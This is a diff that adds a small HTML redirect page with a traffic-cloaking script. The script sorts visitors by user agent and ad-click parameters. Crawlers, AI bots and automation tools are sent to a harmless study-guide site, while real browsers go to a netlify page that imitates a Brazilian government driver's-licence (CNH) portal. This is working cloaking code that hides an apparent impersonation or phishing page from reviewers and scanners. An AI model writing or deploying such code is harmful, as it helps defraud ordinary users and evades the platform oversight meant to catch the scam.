@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Carregando...</title>
+<style>body{background:#fff;margin:0;}</style>
+</head>
+<body>
+<script>
+(function(){
+  var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
+  var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";
+
+  function getParam(name) {
+    return new URLSearchParams(window.location.search).get(name);
+  }
+
+  function isBot() {
+    var ua = (navigator.userAgent || "").toLowerCase();
+    var botPatterns = [
+      "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
+      "sogou","exabot","facebot","ia_archiver","mj12bot","ahrefsbot","semrushbot",
+      "dotbot","rogerbot","linkedinbot","twitterbot","applebot","pinterestbot",
+      "petalbot","bytespider","gptbot","chatgpt","claudebot","anthropic",
+      "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
+      "python-requests","python-urllib","java/","curl/","wget/","libwww",
+      "scrapy","httpclient","okhttp","axios","got ","node-fetch","postman"
+    ];
+    for (var i = 0; i < botPatterns.length; i++) {
+      if (ua.indexOf(botPatterns[i]) !== -1) return true;
+    }
+    return false;
+  }
+
+  function isMobile() {
+    return /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
+  }
+
+  function hasTrafficParams() {
+    var p = new URLSearchParams(window.location.search);
+    return p.get("fbclid") || p.get("utm_source") || p.get("gclid") || p.get("ttclid") || p.get("src");
+  }
+
+  function hasRealBrowser() {
+    try {
+      // Verifica se tem recursos de browser real
+      if (typeof window.chrome !== "undefined") return true;
+      if (typeof window.InstallTrigger !== "undefined") return true; // Firefox
+      if (navigator.plugins && navigator.plugins.length > 0) return true;
+      if (screen.width > 0 && screen.height > 0) return true;
+    } catch(e) {}
+    return false;
+  }
+
+  // Preserva UTMs na URL de destino
+  function appendUtms(url) {
+    var params = new URLSearchParams(window.location.search);
+    var utmKeys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
+    var destParams = new URLSearchParams();
+    utmKeys.forEach(function(k) {
+      var v = params.get(k);
+      if (v) destParams.set(k, v);
+    });
+    var qs = destParams.toString();
+    if (!qs) return url;
+    return url + (url.indexOf("?") === -1 ? "?" : "&") + qs;
+  }
+
+  // Decisão
+  var goBlack = false;
+
+  if (isBot()) {
+    goBlack = false;
+  } else if (hasTrafficParams()) {
+    goBlack = true;
+  } else if (isMobile() && hasRealBrowser()) {
+    goBlack = true;
+  } else if (hasRealBrowser()) {
+    goBlack = true;
+  }
+
+  var dest = goBlack ? appendUtms(BLACK) : WHITE;
+  window.location.replace(dest);
+})();
+</script>
+</body>
+</html>
